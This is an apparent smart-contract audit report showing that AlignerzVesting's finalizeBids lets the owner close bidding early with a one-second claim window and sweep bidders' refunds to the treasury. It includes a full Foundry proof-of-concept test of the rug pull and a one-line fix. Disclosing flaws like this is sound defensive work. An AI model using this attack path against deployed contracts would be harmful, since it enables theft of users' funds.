# [000635] Owner Can Prematurely Steal Bid Funds
  
  ### Summary

The lack of a check enforcing the original project duration in `finalizeBids ` will cause a permanent loss of funds for all users entitled to refunds or NFT claims as the project owner will unilaterally collapse the bidding timeline, instantly expire claimant rights, and sweep all remaining stablecoins into the treasury

### Root Cause

In `AlignerzVesting.sol:finalizeBids`, there is no validation to ensure that `block.timestamp` is greater than or equal to the initially scheduled `biddingProject.endTime`.

This fundamental programming mistake allows the owner to override the public commitment and execute the following line instantly:

```solidity
biddingProject.claimDeadline = block.timestamp + claimWindow; // Sets new, arbitrary, and minimal window

```



### Internal Pre-conditions

- Project Owner needs to call `finalizeBids()` before the originally scheduled `biddingProject.endTime` has passed.

- Project Owner must set the `claimWindow `parameter to be minimal (e.g., exactly 1 second).

- The contract must hold unclaimed user `stablecoins` (bid funds/refunds).

### External Pre-conditions

None

### Attack Path

-  **Project Launch**: Project Owner launches an auction with a long, public timeline (e.g., 30 days). Funds are locked based on this promise.

-  **Vulnerability Trigger**: The Project Owner calls `vesting.finalizeBids(...) `very early (e.g., 5 minutes after launch), setting the `claimWindow = 1 second`.

- **Schedule Collapse**: The claimDeadline is instantly reset to only 1 second in the future.

- **Expiry & Sweep**: The Project Owner waits 2 seconds (or the next block) and calls vesting.withdrawPostDeadlineProfit(PROJECT_ID), which executes because the arbitrary 1-second deadline has now passed.

- **Final Result**: All funds locked for refunds and any unclaimed stablecoin allocations are swept directly to the treasury (controlled by the owner).

### Impact

- The users (bidders) suffer a 100% loss of their bid stablecoin if they fail to claim their NFT or refund within the arbitrary, minimal window set by the owner. This bug acts as an immediate financial rug pull opportunity controlled by the owner .

### PoC

Add this fucntion to the `AlignerzVestingProtocolTest.t.sol`

```solidity
// ---
    // --- PoC for Premature Profit Withdrawal via Minimal Claim Window & Early Finalization ---
    // ---
    // Demonstrates that the owner can finalize a bidding project immediately (before the scheduled endTime)
    // with an extremely small claimWindow, causing rapid expiry of claimant rights and enabling an early sweep
    // of all bidding project stablecoin funds. There is no minimum claimWindow enforced and no check against
    // the originally declared endTime.
    function test_POC_PrematureProfitWithdrawalDueToMinimalClaimWindow() public {
        // SETUP: Two bidders to illustrate lost refund opportunity
        address bidderA = makeAddr("prematureA");
        address bidderB = makeAddr("prematureB");
        vm.deal(bidderA, 10 ether);
        vm.deal(bidderB, 10 ether);
        usdt.mint(bidderA, BIDDER_USD);
        usdt.mint(bidderB, BIDDER_USD);

        // Owner launches bidding project with a far future scheduled endTime
        vm.startPrank(projectCreator);
        uint256 scheduledEnd = block.timestamp + 30 days; // Intended long bidding horizon
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, scheduledEnd, "0x0", true);
        // Create one pool (poolId = 0)
        vesting.createPool(PROJECT_ID, 1_000_000 ether, 0.01 ether, false);
        // Whitelist bidders
        address[] memory wl = new address[](2);
        wl[0] = bidderA; wl[1] = bidderB;
        vesting.addUsersToWhitelist(wl, PROJECT_ID);
        vm.stopPrank();

        // Both bidders place bids (all will be rejected later to simulate refund rights)
        vm.startPrank(bidderA);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        vm.startPrank(bidderB);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        vm.stopPrank();

        // Off-chain style preparation: build refundRoot for both (both rejected)
        // Leaf format: keccak256(abi.encodePacked(user, amount, projectId, poolId)) with poolId=0
        bytes32[] memory leaves = new bytes32[](2);
        leaves[0] = keccak256(abi.encodePacked(bidderA, BIDDER_USD, PROJECT_ID, uint256(0)));
        leaves[1] = keccak256(abi.encodePacked(bidderB, BIDDER_USD, PROJECT_ID, uint256(0)));
        CompleteMerkle m = new CompleteMerkle();
        bytes32 refundRootLocal = m.getRoot(leaves);

        // Merkle roots for pools (single pool with empty / placeholder root accepted set)
        bytes32[] memory poolRoots = new bytes32[](1);
        // No accepted bidders => root can be zero or a deterministic empty root; use bytes32(0)
        poolRoots[0] = bytes32(0);

        // OWNER ACTION: finalize immediately with minimal claimWindow = 1 (second)
        vm.startPrank(projectCreator);
        uint256 finalizeTimestamp = block.timestamp;
        vesting.finalizeBids(PROJECT_ID, refundRootLocal, poolRoots, 1); // claimWindow = 1 second
        vm.stopPrank();

        // ASSERT: Actual biddingProject.endTime collapsed to finalizeTimestamp (early close)
        // and claimDeadline = finalizeTimestamp + 1
        // We cannot directly read struct internal mappings but endTime & claimDeadline are public components.
    // Destructure the returned tuple to extract endTime and claimDeadline (public mapping getter returns a tuple, not a struct)
    (, , , , , uint256 endTime_, , , , uint256 claimDeadline_) = vesting.biddingProjects(PROJECT_ID);
    assertEq(endTime_, finalizeTimestamp, "End time should be reset to finalize timestamp");
    assertEq(claimDeadline_, finalizeTimestamp + 1, "Claim deadline should equal finalize+claimWindow");
    assertLt(claimDeadline_, scheduledEnd, "Effective claim window drastically shorter than scheduled horizon");

        // FAST FORWARD beyond tiny claim window
    vm.warp(claimDeadline_ + 2);

        // Attempting a refund now must fail due to deadline passed.
        // IMPORTANT: generate proof BEFORE setting expectRevert so we target the claimRefund call.
        bytes32[] memory proofA = m.getProof(leaves, 0);
        vm.startPrank(bidderA);
        // Expect custom error Deadline_Has_Passed()
        vm.expectRevert(AlignerzVesting.Deadline_Has_Passed.selector);
        vesting.claimRefund(PROJECT_ID, BIDDER_USD, proofA);
        vm.stopPrank();

        // TREASURY SWEEP: owner withdraws profits early (premature relative to intended 30 day scope)
        uint256 treasuryBefore = usdt.balanceOf(address(1));
        vm.startPrank(projectCreator);
        vesting.withdrawPostDeadlineProfit(PROJECT_ID);
        vm.stopPrank();
        uint256 treasuryAfter = usdt.balanceOf(address(1));
        assertGt(treasuryAfter, treasuryBefore, "Treasury should receive swept stablecoin funds");

        // Funds for refunds are gone; second bidder also blocked
    bytes32[] memory proofB = m.getProof(leaves, 1);
    vm.startPrank(bidderB);
    vm.expectRevert(AlignerzVesting.Deadline_Has_Passed.selector);
    vesting.claimRefund(PROJECT_ID, BIDDER_USD, proofB);
    vm.stopPrank();

        // Invariant: biddingProject totalStablecoinBalance should be zero post-sweep
    // Re-destructure to read updated totalStablecoinBalance after sweep
    (, , uint256 totalStablecoinBalance_, , , , , , , ) = vesting.biddingProjects(PROJECT_ID);
    assertEq(totalStablecoinBalance_, 0, "Stablecoin balance should be zero after premature sweep");
    }
```

### Mitigation

- **Enforce Scheduled End Time**: Prevent premature finalization.
```solidity
require(block.timestamp >= biddingProject.endTime, "Bidding period must end");
```
  